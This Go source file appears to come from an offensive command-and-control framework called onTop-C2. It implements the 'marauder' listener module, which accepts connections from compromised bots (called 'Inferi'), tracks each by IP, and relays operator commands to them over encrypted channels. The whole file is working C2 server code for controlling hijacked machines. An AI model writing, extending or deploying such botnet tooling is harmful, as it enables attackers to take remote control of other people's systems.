package chambers

import (
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Yyax13/onTop-C2/src/fidelius"
	"github.com/Yyax13/onTop-C2/src/misc"
	"github.com/Yyax13/onTop-C2/src/rituals"
	"github.com/Yyax13/onTop-C2/src/spells"
	"github.com/Yyax13/onTop-C2/src/types"
)

type Inferi struct {
	ID			string
	BotIP		string
	Conn		*types.ArcaneLink
	Fidelius	types.FideliusCasting
	In			chan []byte
	Out 		chan []byte
	Spell		types.Spell
	Ritual		types.Ritual
	mu         	sync.Mutex

}

var (
	Inferis = make(map[string]*Inferi)
	inferiMu sync.RWMutex

)

func ipHandler(ip string, channeel chan *types.ArcaneLink, spell types.Spell, timeout int) {
	misc.SysLog(fmt.Sprintf("Starting new handler for %s", ip), true)
	
	inferiMu.Lock()

	var inferi *Inferi
	
	for _, i := range Inferis {
        if i.BotIP == ip {
            inferi = i
            break
        }
    
	}

	if inferi == nil {
		var newId string
		for {
			newId = fmt.Sprintf("i-%d", rand.Intn(900) + 1000)
			if _, exists := Inferis[newId]; !exists {
				break

			}

		}

		inferi = &Inferi{
			ID: newId,
			BotIP: ip,
			In: make(chan []byte, 4096),
			Out: make(chan []byte, 4096),
			Spell: spell,

		}
		
		Inferis[inferi.ID] = inferi
		misc.SysLog(fmt.Sprintf("Starting handler for new inferi: %s\n", inferi.ID), true)
		go sessionHandler(inferi, timeout)
		
	}

	inferiMu.Unlock()

	for conn := range channeel {
		disablePrint := os.Getenv("disableErrorPrintsFromMarauder") == "ye"
		if !disablePrint {
			misc.SysLog(fmt.Sprintf("New connection from IP %s (inferi %s)\n\n", ip, inferi.ID), true)

		}

		inferi.mu.Lock()
		inferi.Conn = conn
		inferi.Fidelius = conn.Fidelius
		inferi.mu.Unlock()

		go handleConn(inferi, conn)

	}

}

func handleConn(sess *Inferi, conn *types.ArcaneLink) {
	defer func() {
        recover()
        conn.Close()
    
		}()

	for {
		disablePrint := os.Getenv("disableErrorPrintsFromMarauder") == "ye"
		line, err := conn.Receive()
		if err != nil {
			if !disablePrint {
				misc.PanicWarn(fmt.Sprintf("Conn from %s closed: %v\n\n", sess.BotIP, err), false)

			}

			return

		}

		select {
		case sess.Out <- []byte(strings.TrimSuffix(string(line), "\n")):
		default:
			misc.PanicWarn(fmt.Sprintf("Dropping incoming packet for %s: Conn out channel is full\n\n", sess.ID), false)

		}

	}
}

func sessionHandler(sess *Inferi, timeoutMins int) {
	timeout := make(chan struct{})
	go func() {
		for {
			time.Sleep(30 * time.Minute)
			
			sess.mu.Lock()
			conn := sess.Conn
			sess.mu.Unlock()
			
			if conn != nil {
				close(timeout)
				return

			}

		}
	
	}()

	for {
		select {
		case cmd, ok := <- sess.In:
			if !ok {
				return

			}

			sess.mu.Lock()
            conn := sess.Conn
            sess.mu.Unlock()

			if conn == nil {
				misc.PanicWarn(fmt.Sprintf("No active conn with %s, queuing ignored cmd\n", sess.BotIP), true)
				continue

			}

			if err := sess.Conn.Send(append(cmd, []byte{0x00}...)); err != nil {
				misc.PanicWarn(fmt.Sprintf("Failed to send to %s: %v\n", sess.ID, err), true)
				sess.mu.Lock()
				sess.Conn = nil
				sess.mu.Unlock()				

			}
		
		case <- timeout:
			misc.PanicWarn(fmt.Sprintf("Inferi %s timed out (%d min without any connections)\n\n", sess.ID, timeoutMins), true)
			
			inferiMu.Lock()
			delete(Inferis, sess.ID)
			inferiMu.Unlock()
			
			return

		}
		
	}
	
}

var MarauderOptions map[string]*types.Rune = map[string]*types.Rune{
	"LPORT": {
		Name: "LPORT",
		Description: "The PORT that marauder will listen",
		Required: true,
		Value: "",
	
	},
	"SPELL": {
		Name: "SPELL",
		Description: "The spell that will try to connect",
		Required: true,
		Value: "",

	},
	"RITUAL": {
		Name: "RITUAL",
		Description: "The ritual used by spell",
		Required: true,
		Value: "",
	
	},
	"FIDELIUS": {
		Name: "FIDELIUS",
		Description: "The FIDELIUS used by RITUAL",
		Required: true,
		Value: "",
	},
	"TIMEOUT": {
		Name: "TIMEOUT",
		Description: "The time in minutes that marauder will await for incoming connections by some IP/Inferi",
		Required: true,
		Value: "",

	},

}

var marauder types.Chamber = types.Chamber{
	Name: "marauder",
	Description: "Listen to connections by specified SPELL using the specified RITUAL",
	Parallel: true,
	Runes: MarauderOptions,
	Execute: StartListener,
	
}

func StartListener(opt map[string]*types.Rune) {
	portOpt, ok := opt["LPORT"]
	if !ok || portOpt.Value == "" {
		misc.PanicWarn("The 'LPORT' rune is unset\n", true)
		return

	}

	port, err := strconv.ParseInt(portOpt.Value, 10, 16)
	if err != nil {
		misc.PanicWarn("The 'LPORT' rune value isn't a number\n", true)
		return

	}

	if !(port > 1024 && port < 65535) {
		misc.PanicWarn("The 'LPORT' rune isn't valid, it must be between 1024 and 65535\n", true)
		return

	}

	timeoutOpt, ok := opt["TIMEOUT"]
	if !ok || portOpt.Value == "" {
		misc.PanicWarn("The 'TIMEOUT' rune is unset\n", true)
		return

	}

	timeout, err := strconv.ParseInt(timeoutOpt.Value, 10, 16)
	if err != nil {
		misc.PanicWarn("The 'TIMEOUT' rune isn't a number\n", true)
		return

	}

	if !(timeout >= 5 && timeout <= 4320) {
		misc.PanicWarn("The 'TIMEOUT' rune isn't valid, it must be between 5 and 4320 (three days in minutes)\n", true)
		return

	}

	ritualOpt, ok := opt["RITUAL"]
	if !ok || ritualOpt.Value == "" {
		misc.PanicWarn("The 'RITUAL' rune is unset\n", true)
		return

	}

	_, ok = rituals.AvaliableRituals[ritualOpt.Value]
	if !ok {
		misc.PanicWarn("The specified 'RITUAL' do not exists, check avaliables using revelio rituals\n", true)
		return

	}

	fideliusOpt, ok := opt["FIDELIUS"]
	if !ok || fideliusOpt.Value == "" {
		misc.PanicWarn("The 'FIDELIUS' rune is unset\n", true)
		return

	}

	fideliusCast, ok := fidelius.AvaliableFidelius[fideliusOpt.Value]
	if !ok {
		misc.PanicWarn("The specified 'FIDELIUS' do not exists, check avaliables using revelio fidelius\n", true)
		return

	}

	spellOpt, ok := opt["SPELL"]
	if !ok || spellOpt.Value == "" {
		misc.PanicWarn("The 'SPELL' rune is unset\n", true)
		return

	}

	spell, ok := spells.AvaliableSpells[spellOpt.Value]
	if !ok {
		misc.PanicWarn("The specified 'SPELL' do not exists, check avaliables using revelio spells\n", true)
		return

	}

	ritualCreator, ok := rituals.AvaliableRitualCreators[ritualOpt.Value]
	if !ok {
		misc.PanicWarn(fmt.Sprintf("The %s ritual creator do not exists, please use another ritual and/or open a issue\n", ritualOpt.Value), true)
		return

	}

	ritualListenerParams := map[string]string{
		"LPORT": fmt.Sprintf("%d", port),
		"FIDELIUS": string(fideliusCast.Name),

	}

	_, ritualListenerInit, err := ritualCreator(ritualListenerParams)
	if err != nil {
		misc.PanicWarn(fmt.Sprintf("Some error occurred when tried to get a  initListener instance: %v. Open a issue or try another ritual\n", err), true)
		return

	}
	
	connectedClients := make(map[string]chan *types.ArcaneLink)
	var mu sync.Mutex
	
	misc.SysLog(fmt.Sprintf("Listening in the port %d...\n", port), true)
	for {
		ritualListener, err := ritualListenerInit.InitListener()
		if err != nil {
			misc.PanicWarn(fmt.Sprintf("Some error occurred during connection: %s\n", err), true)
			continue

		}

		mu.Lock()
		connIP := ritualListener.ClientScroll.IP.String()
		if connIP == "<nil>" {
			connIP = "Unknown"

		}

		ch, alreadyExists := connectedClients[connIP]
		if !alreadyExists && connIP != "Unknown" {
			ch = make(chan *types.ArcaneLink)
			connectedClients[connIP] = ch

			go ipHandler(connIP, ch, *spell, int(timeout))

		}

		mu.Unlock()
		ch <- ritualListener

	}

}

func init() {
	RegisterNewModule(&marauder)
	
}